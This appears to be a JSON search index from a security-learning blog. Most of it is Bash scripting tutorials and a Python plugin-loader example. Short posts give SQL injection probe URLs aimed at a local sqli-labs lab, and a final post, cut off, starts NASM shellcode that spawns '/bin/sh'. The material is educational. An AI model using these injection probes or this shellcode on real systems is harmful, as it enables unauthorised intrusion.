Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/"}],"tags":[]},{"title":"Character-based SQL Injection","slug":"SQLInjectionCharacter","date":"2016-10-21T01:55:22.000Z","updated":"2023-10-18T22:55:32.715Z","comments":true,"path":"2016/10/20/SQLInjectionCharacter/","link":"","permalink":"http://example.com/2016/10/20/SQLInjectionCharacter/","excerpt":"","text":"Detection of character-based SQL Injection: 12http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Character-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/"}],"tags":[]},{"title":"Detection of Numeric-based SQL Injection","slug":"SQLInjectionNumberBased","date":"2016-10-19T01:02:42.000Z","updated":"2023-10-18T22:54:14.840Z","comments":true,"path":"2016/10/18/SQLInjectionNumberBased/","link":"","permalink":"http://example.com/2016/10/18/SQLInjectionNumberBased/","excerpt":"","text":"Detection of numeric-based SQL injection: 1http://127.0.0.1/sqli-labs-master/Less-2/?id=2-1","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Numeric-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection/"}],"tags":[]},{"title":"Bash Scripting 09 - Functions","slug":"BashScript09-Functions","date":"2012-04-16T01:22:35.000Z","updated":"2023-10-25T13:59:04.716Z","comments":true,"path":"2012/04/15/BashScript09-Functions/","link":"","permalink":"http://example.com/2012/04/15/BashScript09-Functions/","excerpt":"","text":"In terms of Bash scripting, we can think of a function as a script within a script, which is usefulwhen we need to execute the same code multiple times in a script. Rather than re-writing the samechunk of code over and over, we just write it once as a function and then call that function asneeded.Put another way, a function is a subroutine, or a code block that implements a set of operations–a“black box” that performs a specified task. Functions may be written in two different formats. Thefirst format is more common to Bash scripts: 123function function_name &#123; commands...&#125; The second format is more familiar to C programmers: 123function_name () &#123; commands...&#125; The formats are functionally identical and are a matter of personal preference. Let’s look at a simple example: 12345678910kali@kali:~$ cat ./func.sh#!/bin/bash# function exampleprint_me () &#123; echo &quot;You have been printed!&quot;&#125;print_mekali@kali:~$ chmod +x ./func.shkali@kali:~$ ./func.shYou have been printed! Functions can also accept arguments: 12345678910kali@kali:~$ cat ./funcarg.sh#!/bin/bash# passing arguments to functionspass_arg() &#123; echo &quot;Today&#x27;s random number is: $1&quot;&#125;pass_arg $RANDOMkali@kali:~$ chmod +x ./funcarg.shkali@kali:~$ ./funcarg.shToday&#x27;s random number is: 25228 In this case, we passed a random number, $RANDOM, into the function, which outputs it as $1, thefunctions first argument. Note that the function definition (pass_arg()) contains parentheses. Inother programming languages, such as C, these would contain the expected arguments, but inBash the parentheses serve only as decoration. They are never used. Also note that the functiondefinition (the function itself) must appear in the script before it is called. Logically, we can’t callsomething we have not defined. In addition to passing arguments to Bash functions, we can of course return values from Bashfunctions as well. Bash functions do not actually allow you to return an arbitrary value in thetraditional sense. Instead, a Bash function can return an exit status (zero for success, non-zero forfailure) or some other arbitrary value that we can later access from the $? global variable (see Table prev article). Alternatively, we can set a global variable inside the function or use command substitution tosimulate a traditional return.Let’s look at a simple example that returns a random number into $?: 12345678910111213141516kali@kali:~$ cat funcrvalue.sh#!/bin/bash# function return value examplereturn_me() &#123; echo &quot;Oh hello there, I&#x27;m returning a random value!&quot; return $RANDOM&#125;return_meecho &quot;The previous function returned a value of $?&quot;kali@kali:~$ chmod +x ./funcrvalue.shkali@kali:~$ ./funcrvalue.shOh hello there, I&#x27;m returning a random value!The previous function returned a value of 123kali@kali:~$ ./funcrvalue.shOh hello there, I&#x27;m returning a random value!The previous function returned a value of 432 Notice that a random number is returned every time we run the script, because we returned thespecial global variable $RANDOM (into $?). If we used the return statement without the $RANDOMargument, the exit status of the function (0 in this case) would be returned instead.Now that we have a basic understanding of variables and functions, we can dig deeper and discussvariable scope.The scope of a variable is simply the context in which it has meaning. By default, a variable has aglobal scope, meaning it can be accessed throughout the entire script. In contrast, a local variablecan only be seen within the function, block of code, or subshell in which it is defined. We can“overlay” a global variable, giving it a local context, by preceding the declaration with the localkeyword, leaving the global variable untouched. The general syntax is: 1local name=&quot;Joe&quot; Let’s see how local and global variables work in practice with a simple example: 123456789101112131415161718kali@kali:~$ cat ./varscope.sh#!/bin/bash# var scope examplename1=&quot;John&quot;name2=&quot;Jason&quot;name_change() &#123; local name1=&quot;Edward&quot; echo &quot;Inside of this function, name1 is $name1 and name2 is $name2&quot; name2=&quot;Lucas&quot;&#125;echo &quot;Before the function call, name1 is $name1 and name2 is $name2&quot;name_changeecho &quot;After the function call, name1 is $name1 and name2 is $name2&quot;kali@kali:~$ chmod +x ./varscope.shkali@kali:~$ ./varscope.shBefore the function call, name1 is John and name2 is JasonInside of this function, name1 is Edward and name2 is JasonAfter the function call, name1 is John and name2 is Lucas Let’s highlight a few key points within the code. First note that we declared two global variables,setting name1 to John and name2 to Jason.Then, we defined a function and inside that function, declared a local variable called name1, settingthe value to Edward. Since this was a local variable, the previous global assignment was notaffected; name1 will still be set to John outside this function.Next, we set name2 to Lucas, and since we did not use the local keyword, we are changing theglobal variable, and the assignment sticks both inside and outside of the function.Based on this example, the following two points summarize variable scope:• Changing the value of a local variable with the same name as a global one will not affect itsglobal value.• Changing the value of a global variable inside of a function – without having declared a localvariable with the same name – will affect its global value.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 09 - Functions","slug":"Bash/Bash-Scripting-09-Functions","permalink":"http://example.com/categories/Bash/Bash-Scripting-09-Functions/"}],"tags":[]},{"title":"Bash Scripting 08 - While Loops","slug":"BashScript08-WhileLoops","date":"2012-03-25T03:17:12.000Z","updated":"2023-10-24T01:53:37.285Z","comments":true,"path":"2012/03/24/BashScript08-WhileLoops/","link":"","permalink":"http://example.com/2012/03/24/BashScript08-WhileLoops/","excerpt":"","text":"While loops are also fairly common and execute code while an expression is true. While loops havea simple format and, like if, use the square brackets ([]) for the test: 1234while [ &lt;some test&gt; ]do&lt;perform an action&gt;done Let’s re-create the previous example with a while loop: 1234567891011121314151617181920kali@kali:~$ cat ./while.sh#!/bin/bash# while loop examplecounter=1while [ $counter -lt 10 ]doecho &quot;10.11.1.$counter&quot;((counter++))donekali@kali:~$ chmod +x ./while.shkali@kali:~$ ./while.sh10.11.1.110.11.1.210.11.1.310.11.1.410.11.1.510.11.1.610.11.1.710.11.1.810.11.1.9 This is not the output we expected. This is a common mistake called an “off by one” error. In theexample above, we used -lt (less than) instead of -le (less than or equal to), so our counter only gotto nine, not ten as originally intended. The ((counter++)) line uses the double-parenthesis (( )) construct to perform arithmeticexpansion and evaluation at the same time. In this particular case, we use it to increase our countervariable by one. Let’s re-write the while loop and try the example again: 123456789101112131415161718192021kali@kali:~$ cat ./while2.sh#!/bin/bash# while loop example 2counter=1while [ $counter -le 10 ]doecho &quot;10.11.1.$counter&quot;((counter++))donekali@kali:~$ chmod +x ./while2.shkali@kali:~$ ./while2.sh10.11.1.110.11.1.210.11.1.310.11.1.410.11.1.510.11.1.610.11.1.710.11.1.810.11.1.910.11.1.10 Our while loop is looking much better now.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 08 - While Loops","slug":"Bash/Bash-Scripting-08-While-Loops","permalink":"http://example.com/categories/Bash/Bash-Scripting-08-While-Loops/"}],"tags":[]},{"title":"Bash Scripting 07 - For Loops","slug":"BashScript07-ForLoops","date":"2012-03-24T01:11:45.000Z","updated":"2023-10-24T01:53:32.866Z","comments":true,"path":"2012/03/23/BashScript07-ForLoops/","link":"","permalink":"http://example.com/2012/03/23/BashScript07-ForLoops/","excerpt":"","text":"In computer programming, loops help us with repetitive tasks that we need to run until a certaincriteria is met. Iteration is particularly useful for penetration testers, so we recommend paying veryclose attention to this section.In Bash, the two most predominant loop commands are for and while. We will take a look at both. For loops are very practical and work very well in Bash one-liners. This type of loop is used toperform a given set of commands for each of the items in a list. Let’s briefly look at its generalsyntax: 1234for var-name in &lt;list&gt;do&lt;action to perform&gt;done The for loop will take each item in the list (in order), assign that item as the value of the variable varname, perform the given action between do and done, and then go back to the top, grab the nextitem in the list, and repeat the steps until the list is exhausted. Let’s take a look at a more practical example that will quickly print the first 10 IP addresses in the10.11.1.0&#x2F;24 subnet: 1234567891011kali@kali:~$ for ip in $(seq 1 10); do echo 10.11.1.$ip; done10.11.1.110.11.1.210.11.1.310.11.1.410.11.1.510.11.1.610.11.1.710.11.1.810.11.1.910.11.1.10 In this Bash one-liner, we used the seq command to print a sequence of numbers, inthis case the numbers one through ten. Each number is then assigned to the ip variable, and theneach IP address is displayed to the screen as the for loop runs multiple times, exiting at the end ofthe sequence.Another way of re-writing the previous for loop involves brace expansion using ranges. Braceexpansion using ranges is written giving the first and last values of the range and can be a sequenceof numbers or characters. This is known as a “sequence expression”: 1234567891011kali@kali:~$ for i in &#123;1..10&#125;; do echo 10.11.1.$i;done10.11.1.110.11.1.210.11.1.310.11.1.410.11.1.510.11.1.610.11.1.710.11.1.810.11.1.910.11.1.10 There is a lot of potential for this type of loop. Displaying IP addresses to the screen may not seemvery useful, but we can use the same loop to run a port scan using nmap (which we discuss indetail in another module). We can also attempt to use the ping command to see if any of the IPaddresses respond to ICMP echo requests, etc.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 07 - For Loops","slug":"Bash/Bash-Scripting-07-For-Loops","permalink":"http://example.com/categories/Bash/Bash-Scripting-07-For-Loops/"}],"tags":[]},{"title":"Bash Scripting 06 - Boolean Logical Operations","slug":"BashScript06-BooleanLogicalOperations","date":"2012-03-20T03:11:03.000Z","updated":"2023-10-24T01:53:28.806Z","comments":true,"path":"2012/03/19/BashScript06-BooleanLogicalOperations/","link":"","permalink":"http://example.com/2012/03/19/BashScript06-BooleanLogicalOperations/","excerpt":"","text":"Boolean logical operators, like AND (&amp;&amp;) and OR (||) are somewhat mysterious because Bashuses them in a variety of ways.One common use is in command lists, which are chains of commands whose flow is controlled byoperators. The “|” (pipe) symbol is a commonly-used operator in a command list and passes theoutput of one command to the input of another. Similarly, boolean logical operators executecommands based on whether a previous command succeeded (or returned True or 0) or failed(returned False or non-zero).Let’s take a look at the AND (&amp;&amp;) boolean operator first, which executes a command only if theprevious command succeeds (or returns True or 0): 123456kali@kali:~$ user2=kalikali@kali:~$ grep $user2 /etc/passwd &amp;&amp; echo &quot;$user2 found!&quot;kali:x:1000:1000:,,,:/home/kali:/bin/bashkali found!kali@kali:~$ user2=bobkali@kali:~$ grep $user2 /etc/passwd &amp;&amp; echo &quot;$user2 found!&quot; In this example, we first assigned the username we are searching for to the user2 variable. Next,we use the grep command to check if a certain user is listed in the /etc/passwd file, and if it is,grep returns True and the echo command is executed. However, when we try searching for a userthat we know does not exist in the /etc/passwd file, our echo command is not executed. When used in a command list, the OR (||) operator is the opposite of AND (&amp;&amp;); it executes the nextcommand only if the previous command failed (returned False or non-zero): 12345kali@kali:~$ echo $user2bobkali@kali:~$ grep $user2 /etc/passwd &amp;&amp; echo &quot;$user2 found!&quot; || echo &quot;$user2 not found!&quot;bob not found! In the above example, we took our previous command a step further and added the OR (||) operatorfollowed by a second echo command. Now, when grep does not find a matching line and returnsFalse, the second echo command after the OR (||) operator is executed instead.These operators can also be used in a test to compare variables or the results of other tests. Whenused this way, AND (&amp;&amp;) combines two simple conditions, and if they are both true, the combinedresult is success (or True or 0).Consider this example: 123456789101112131415kali@kali:~$ cat ./and.sh#/bin/bash# and exampleif [ $USER == &#x27;kali&#x27; ] &amp;&amp; [ $HOSTNAME == &#x27;kali&#x27; ]thenecho &quot;Multiple statements are true!&quot;elseecho &quot;Not much to see here...&quot;fikali@kali:~$ chmod +x ./and.shkali@kali:~$ ./and.shMultiple statements are true!kali@kali:~$ echo $USER &amp;&amp; echo $HOSTNAMEkalikali In this example, we used AND (&amp;&amp;) to test multiple conditions and since both variable comparisonswere true, the whole if line succeeded, so the then branch executed.When used in a test, the OR (||) boolean operator is used to test one or more conditions, but onlyone of them has to be true to count as success.Let’s take a look at an example: 123456789101112131415kali@kali:~$ cat ./or.sh#!/bin/bash# or exampleif [ $USER == &#x27;kali&#x27; ] || [ $HOSTNAME == &#x27;pwn&#x27; ]thenecho &quot;One condition is true, this line is printed&quot;elseecho &quot;You are out of luck!&quot;fikali@kali:~$ chmod +x ./or.shkali@kali:~$ ./or.shOne condition is true, this line is printedkali@kali:~$ echo $USER &amp;&amp; echo $HOSTNAMEkalikali In this example, we used OR (||) to test multiple conditions and since one of the variablecomparisons was true, the whole if line succeeded, so the then branch executed.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 06 - Boolean Logical Operations","slug":"Bash/Bash-Scripting-06-Boolean-Logical-Operations","permalink":"http://example.com/categories/Bash/Bash-Scripting-06-Boolean-Logical-Operations/"}],"tags":[]},{"title":"Bash Scripting 05 - If, Else, Elif Statements","slug":"BashScript05-IfElseElifStatements","date":"2012-03-18T02:24:49.000Z","updated":"2023-10-24T01:53:23.558Z","comments":true,"path":"2012/03/17/BashScript05-IfElseElifStatements/","link":"","permalink":"http://example.com/2012/03/17/BashScript05-IfElseElifStatements/","excerpt":"","text":"Conditional statements allow us to perform different actions based on different conditions. Themost common conditional Bash statements include if, else, and elif.The if statement is relatively simple–it checks to see if a condition is true–but it requires a veryspecific syntax. Pay careful attention to this syntax, especially the use of required spaces: 1234if [ &lt;some test&gt; ]then&lt;perform an action&gt;fi In this listing, if “some test” evaluates as true, the script will “perform an action”, or any commandsbetween then and fi. Let’s look at an actual example: 123456789101112kali@kali:~$ cat ./if.sh#!/bin/bash# if statement exampleread -p &quot;What is your age: &quot; ageif [ $age -lt 16 ]thenecho &quot;You might need parental permission to take this course!&quot;fikali@kali:~$ chmod +x ./if.shkali@kali:~$ ./if.shWhat is your age: 15You might need parental permission to take this course! In this example, we used an if statement to check the age entered by a user. If the entered age wasless than (-lt) 16, the script would output a warning message.The square brackets (“[“ and “]”) in the if statement above are actually a reference to the testcommand. This simply means we can use all of the operators that are allowed by the testcommand. Some of the most common operators include: Operator Description: Expression True if… !EXPRESSION The EXPRESSION is false. -n STRING STRING length is greater than zero -z STRING The length of STRING is zero (empty) STRING1 !&#x3D; STRING2 STRING1 is not equal to STRING2 STRING1 &#x3D; STRING2 STRING1 is equal to STRING2 INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2 INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2 INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2 INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2 INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2 INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2 -d FILE FILE exists and is a directory -e FILE FILE exists -r FILE FILE exists and has read permission -s FILE FILE exists and it is not empty -w FILE FILE exists and has write permission -x FILE FILE exists and has execute permission With the above in mind, our previous example using if can be rewritten without square brackets asfollows: 123456789101112kali@kali:~$ cat ./if2.sh#!/bin/bash# if statement example 2read -p &quot;What is your age: &quot; ageif test $age -lt 16thenecho &quot;You might need parental permission to take this course!&quot;fikali@kali:~$ chmod +x ./if2.shkali@kali:~$ ./if2.shWhat is your age: 15You might need parental permission to take this course! Even though this example is functionally equivalent to the example using square brackets, usingsquare brackets makes the code slightly easier to read.We can also perform a certain set of actions if a statement is true and another set if it is false. Todo this, we can use the else statement, which has the following syntax: 123456if [ &lt;some test&gt; ]then&lt;perform action&gt;else&lt;perform another action&gt;fi Let’s extend our previous “age” example to include the else statement: 1234567891011121314kali@kali:~$ cat ./else.sh#!/bin/bash# else statement exampleread -p &quot;What is your age: &quot; ageif [ $age -lt 16 ]thenecho &quot;You might need parental permission to take this course!&quot;elseecho &quot;Welcome to the course!&quot;fikali@kali:~$ chmod +x ./else.shkali@kali:~$ ./else.shWhat is your age: 21Welcome to the course! Notice that the else statement was executed when the entered age was greater than (or morespecifically “not less than”) sixteen.The if and else statements only allow two code execution branches. We can add additionalbranches with the elif statement which uses the following pattern: 123456789if [ &lt;some test&gt; ]then&lt;perform action&gt;elif [ &lt;some test&gt; ]then&lt;perform different action&gt;else&lt;perform yet another different action&gt;fi Let’s again extend our “age” example to include the elif statement: 1234567891011121314151617kali@kali:~$ cat ./elif.sh#!/bin/bash# elif exampleread -p &quot;What is your age: &quot; ageif [ $age -lt 16 ]thenecho &quot;You might need parental permission to take this course!&quot;elif [ $age -gt 60 ]thenecho &quot;Hats off to you, respect!&quot;elseecho &quot;Welcome to the course!&quot;fikali@kali:~$ chmod +x ./elif.shkali@kali:~$ ./elif.shWhat is your age: 65Hats off to you, respect! In this example, the code execution flow was slightly more complex. In order of operation, the thenbranch executes if the entered age is less than sixteen, the elif branch is entered (and the “Hatsoff..” message displayed) if the age is greater than sixty, and the else branch executes only if theage is greater than sixteen but less than sixty.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 05 - If, Else, Elif Statements","slug":"Bash/Bash-Scripting-05-If-Else-Elif-Statements","permalink":"http://example.com/categories/Bash/Bash-Scripting-05-If-Else-Elif-Statements/"}],"tags":[]},{"title":"Bash Scripting 04 - Reading User Input","slug":"BashScript04-ReadingUserInput","date":"2012-03-14T01:21:31.000Z","updated":"2023-10-24T01:49:39.848Z","comments":true,"path":"2012/03/13/BashScript04-ReadingUserInput/","link":"","permalink":"http://example.com/2012/03/13/BashScript04-ReadingUserInput/","excerpt":"","text":"Command-line arguments are a form of user input, but we can also capture interactive user inputwhile a script is running with the read command. In this example, we will use read to capture userinput and assign it to a variable: 12345678910kali@kali:~$ cat ./input.sh#!/bin/bashecho &quot;Hello there, would you like to learn how to hack: Y/N?&quot;read answerecho &quot;Your answer was $answer&quot;kali@kali:~$ chmod +x ./input.shkali@kali:~$ ./input.shHello there, would you like to learn how to hack: Y/N?YYour answer was Y We can alter the behavior of the read command with various command line options. Two of themost commonly used options include -p, which allows us to specify a prompt, and -s, which makesthe user input silent. The latter is ideal for capturing user credentials: 1234567891011kali@kali:~$ cat ./input2.sh#!/bin/bash# Prompt the user for credentialsread -p &#x27;Username: &#x27; usernameread -sp &#x27;Password: &#x27; passwordecho &quot;Thanks, your creds are as follows: &quot; $username &quot; and &quot; $passwordkali@kali:~$ chmod +x ./input2.shkali@kali:~$ ./input2.shUsername: kaliPassword:Thanks, your creds are as follows: kali and nothing2see!","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 04 - Reading User Input","slug":"Bash/Bash-Scripting-04-Reading-User-Input","permalink":"http://example.com/categories/Bash/Bash-Scripting-04-Reading-User-Input/"}],"tags":[]},{"title":"Bash Scripting 03 - Arguments","slug":"BashScript03-Arguments","date":"2012-03-08T01:53:07.000Z","updated":"2023-10-24T01:49:42.990Z","comments":true,"path":"2012/03/07/BashScript03-Arguments/","link":"","permalink":"http://example.com/2012/03/07/BashScript03-Arguments/","excerpt":"","text":"Not all Bash scripts require arguments. However, it is extremely important to understand howthey are interpreted by Bash and how to use them. We have already executed Linux commandswith arguments. For example, when we run the command ls -l /var/log, both -l and /var/logare arguments to the ls command.Bash scripts are no different; we can supply command-line arguments and use them in our scripts: 123456kali@kali:~$ cat ./arg.sh#!/bin/bashecho &quot;The first two arguments are $1 and $2&quot;kali@kali:~$ chmod +x ./arg.shkali@kali:~$ ./arg.sh hello thereThe first two arguments are hello and there Here we created a simple Bash script, set executable permissions on it, and then ran itwith two arguments. The $1 and $2 variables represent the first and second arguments passed tothe script. Let’s explore a few special Bash variables: Variable Name Description $0 The name of the Bash script $1 - $9 The first 9 arguments to the Bash script $# Number of arguments passed to the Bash script $@ All arguments passed to the Bash script $? The exit status of the most recently run process $$ The process ID of the current script $USER The username of the user running the script $HOSTNAME The hostname of the machine $RANDOM A random number $LINENO The current line number in the script Some of these special variables can be very useful when debugging a script. For example, we mightbe able to obtain the exit status of a command to determine whether it was successfully executedor not.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 03 - Arguments","slug":"Bash/Bash-Scripting-03-Arguments","permalink":"http://example.com/categories/Bash/Bash-Scripting-03-Arguments/"}],"tags":[]},{"title":"Bash Scripting 02 - Variables","slug":"BashScript02-Variables","date":"2012-03-06T02:45:38.000Z","updated":"2023-10-24T01:48:39.369Z","comments":true,"path":"2012/03/05/BashScript02-Variables/","link":"","permalink":"http://example.com/2012/03/05/BashScript02-Variables/","excerpt":"","text":"Variables are named places to temporarily store data. We can set (or “declare”) a variable, whichassigns a value to it, or read a variable, which will “expand” or “resolve” it to its stored value. We can declare variable values in a number of ways. The easiest method is to set the value directlywith a simple name&#x3D;value declaration. Notice that there are no spaces before or after the “&#x3D;” sign: 1kali@kali:~$ first_param=Super Declaring a variable is pointless unless we can reference it. To do this, we precede the variable withthe “$” character. Whenever Bash encounters this syntax in a command, it replaces the variablename with its value (“expands” the variable) before execution: 1234kali@kali:~$ first_param=Superkali@kali:~$ last_param=Herokali@kali:~$ echo $first_param $last_paramSuper Hero Variable names may be uppercase, lowercase, or a mixture of both. However, Bash is casesensitive so we must be consistent when declaring and expanding variables. In addition, it’s goodpractice to use descriptive variable names, which make our scripts much easier to read andmaintain. Be advised that Bash interprets certain characters in specific ways. For example, this declarationdemonstrates an improper multi-value variable declaration: 12kali@kali:~$ greeting=Hello Worldbash: World: command not found This was not necessarily what we expected. To fix this, we can use either single quotes (‘) or doublequotes (“) to enclose our text. However, Bash treats single and double quotes differently. Whenencountering single quotes, Bash interprets every enclosed character literally. When enclosed indouble quotes, all characters are viewed literally except “$”, “&#96;”, and “&quot; meaning variables will beexpanded in an initial substitution pass on the enclosed text. A simple example will help clarify this: 123456kali@kali:~$ greeting=&#x27;Hello World&#x27;kali@kali:~$ echo $greetingHello Worldkali@kali:~$ greeting2=&quot;New $greeting&quot;kali@kali:~$ echo $greeting2New Hello World In this example, the single-quote-enclosed declaration of greeting preserved the value of our textexactly and did not interpret the space as a command delimiter. However, in the double-quoteenclosed declaration of greeting2, Bash expanded $greeting to its value (“Hello World”), honoringthe special meaning of the “$” character.We can also set the value of the variable to the result of a command or program. This is known ascommand substitution, which allows us to take the output of a command or program (whatwould normally be printed to the screen) and have it saved as the value of a variable.To do this, place the variable name in parentheses “()”, preceded by a “$” character: 123kali@kali:~$ user=$(whoami)kali@kali:~$ echo $userkali Here we assigned the output of the whoami command to the user variable. We thendisplayed its value. An alternative syntax for command substitution using the backtick, or grave,character (&#96;) is shown below: 123kali@kali:~$ user2=`whoami`kali@kali:~$ echo $user2kali The backtick method is older and typically discouraged as there are differences in how the twomethods of command substitution behave. It is also important to note that commandsubstitution happens in a subshell and changes to variables in the subshell will not alter variablesfrom the master process. This is demonstrated in the following example: 123456789101112131415161718192021222324kali@kali:~$ cat ./subshell.sh#!/bin/bash -xvar1=value1echo $var1var2=value2echo $var2$(var1=newvar1)echo $var1`var2=newvar2`echo $var2kali@kali:~$ ./subshell.sh+ var1=value1+ echo value1value1+ var2=value2+ echo value2value2++ var1=newvar1+ echo value1value1++ var2=newvar2+ echo value2value2kali@kali:~$ In this example, first note that we changed the shebang, adding in the -x flag. This instructed Bashto print additional debug output, so we could more easily see the commands that were executedand their results. As we view this output, notice that commands preceded with a single “+” characterwere executed in the current shell and commands preceded with a double “++” were executed in asubshell.This allows us to clearly see that the second declarations of var1 and var2 happened inside asubshell and did not change the values in the current shell as the initial declarations did.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 02 - Variables","slug":"Bash/Bash-Scripting-02-Variables","permalink":"http://example.com/categories/Bash/Bash-Scripting-02-Variables/"}],"tags":[]},{"title":"Bash Scripting 01 - Intro to Bash Scripting","slug":"BashScript01-IntroduceBashScript","date":"2012-03-03T03:27:59.000Z","updated":"2023-10-24T01:48:25.168Z","comments":true,"path":"2012/03/02/BashScript01-IntroduceBashScript/","link":"","permalink":"http://example.com/2012/03/02/BashScript01-IntroduceBashScript/","excerpt":"","text":"The GNU Bourne-Again Shell (Bash) is a powerful work environment and scripting engine. Acompetent security professional skillfully leverages Bash scripting to streamline and automatemany Linux tasks and procedures. In this module, we will introduce Bash scripting and exploreseveral practical scenarios. A Bash script is a plain-text file that contains a series of commands that are executed as if they hadbeen typed at a terminal prompt. Generally speaking, Bash scripts have an optional extension of.sh (for ease of identification), begin with #!&#x2F;bin&#x2F;bash and must have executable permissions setbefore they can be executed. Let’s begin with a simple “Hello World” Bash script, file named hello-world.sh: 123#!/bin/bash# Hello World Bash Scriptecho &quot;Hello World!&quot; This script has several components worth explaining:• Line 1: #! is commonly known as the shebang, and is ignored by the Bash interpreter. Thesecond part, &#x2F;bin&#x2F;bash, is the absolute path to the interpreter, which is used to run thescript. This is what makes this a “Bash script” as opposed to another type of shell script, likea “C Shell script”, for example.• Line 2: # is used to add a comment, so all text that follows it is ignored.• Line 3: echo “Hello World!” uses the echo Linux command utility to print a given string to theterminal, which in this case is “Hello World!”. Next, let’s make the script executable and run it: 123kali@kali:~$ chmod +x hello-world.shkali@kali:~$ ./hello-world.shHello World! The chmod command, along with the +x option is used to make the script executable..&#x2F;helloworld.sh is used to actually run it.The .&#x2F; notation may seem confusing but this is simply a pathnotation indicating that this script is in the current directory. Whenever we type a command, Bashtries to find it in a series of directories stored in a variable called PATH. Since our home directoryis not included in that variable, we must use the relative path to our Bash script in order for Bashto “find it” and run it. Now that we have created our first Bash script,next we will explore Bash in a bit more detail.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 01 - Intro to Bash Scripting","slug":"Bash/Bash-Scripting-01-Intro-to-Bash-Scripting","permalink":"http://example.com/categories/Bash/Bash-Scripting-01-Intro-to-Bash-Scripting/"}],"tags":[]},{"title":"A Simple Plugin System by Python","slug":"SimplePluginSystemByPython","date":"2011-10-22T20:41:33.000Z","updated":"2023-10-18T21:50:41.991Z","comments":true,"path":"2011/10/22/SimplePluginSystemByPython/","link":"","permalink":"http://example.com/2011/10/22/SimplePluginSystemByPython/","excerpt":"","text":"Due to the requirements of my work, I needed to design an open software system, and immediately thought of the Python language. As a result, I designed a simple and easily extensible plugin system. Here’s the code: 12345678910111213141516171819202122232425262728293031323334353637383940414243#main.pyimport importlibclass PluginManager: def __init__(self): self.plugins = [] self.func_name = &quot;MyPlugin&quot; def load_plugin(self, plugin_name): try: plugin_module = importlib.import_module(f&#x27;plugins.&#123;plugin_name&#125;&#x27;) plugin_instance = getattr(plugin_module, self.func_name)() self.plugins.append(plugin_instance) print(f&quot;plugin &#123;plugin_name&#125; loaded.&quot;) except ImportError: print(f&quot;Load plugin &#123;plugin_name&#125; failed.&quot;) def run_plugins(self): for plugin in self.plugins: plugin.run()if __name__ == &quot;__main__&quot;: manager = PluginManager() while True: print(&quot;1. Add Plugin&quot;) print(&quot;2. Run Plugin&quot;) print(&quot;3. Quit&quot;) choice = input(&quot;Your Select: &quot;) if choice == &quot;1&quot;: plugin_name = input(&quot;Please input the name of plugin: &quot;) manager.load_plugin(plugin_name) elif choice == &quot;2&quot;: manager.run_plugins() elif choice == &quot;3&quot;: break Then, you create a directory named ‘plugins.’ In this directory, you can add your plugin, which must define a class named ‘MyPlugin’ and must have a function named ‘run’. Here is the simple code: 1234567#my_pluginclass MyPlugin: def __init__(self): pass def run(self): print(&quot;MyPlugin is running&quot;) The following is the running process: 123456789101112131415161. Add Plugin2. Run Plugin3. QuitYour Select: 1Please input the name of plugin: my_pluginplugin my_plugin loaded.1. Add Plugin2. Run Plugin3. QuitYour Select: 2MyPlugin is running1. Add Plugin2. Run Plugin3. QuitYour Select: 3PS C:\\Users\\xxx\\Desktop\\yyy\\plugin-system&gt; You can use this model to design a big and an opened software system.","categories":[{"name":"System Architecture","slug":"System-Architecture","permalink":"http://example.com/categories/System-Architecture/"},{"name":"Plugin Pattern","slug":"System-Architecture/Plugin-Pattern","permalink":"http://example.com/categories/System-Architecture/Plugin-Pattern/"}],"tags":[]},{"title":"Shellcode Written in Linux","slug":"shellcodewrite","date":"2011-10-16T15:54:47.000Z","updated":"2023-10-17T16:05:08.840Z","comments":true,"path":"2011/10/16/shellcodewrite/","link":"","permalink":"http://example.com/2011/10/16/shellcodewrite/","excerpt":"","text":"Before you start learning shellcode development, please install NASM on your Linux system. Here’s the shellcode code: 12345678910111213141516171819202122232425section .textglobal _start_start:jmp short callShellcodeshellcode:pop esi ; Pop &#x27;/bin/sh&#x27; from the stack into esixor eax, eax ; Set eax to NULLmov byte [esi 